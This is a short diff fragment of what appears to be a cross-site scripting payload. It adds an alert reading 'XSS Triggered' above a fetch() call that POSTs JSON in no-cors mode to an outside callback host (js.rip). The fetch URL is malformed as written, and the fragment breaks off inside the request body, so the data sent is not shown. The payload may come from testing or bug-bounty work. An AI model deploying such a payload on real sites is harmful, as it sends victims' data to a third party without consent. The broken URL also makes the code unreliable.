@@ -1,4 +1,6 @@
+alert("XSS Triggered ✅");
 fetch(https://"https://js.rip/1v7sr0xo3h", { 
+      
   method: "POST",
   mode: "no-cors",
   body: JSON.stringify({
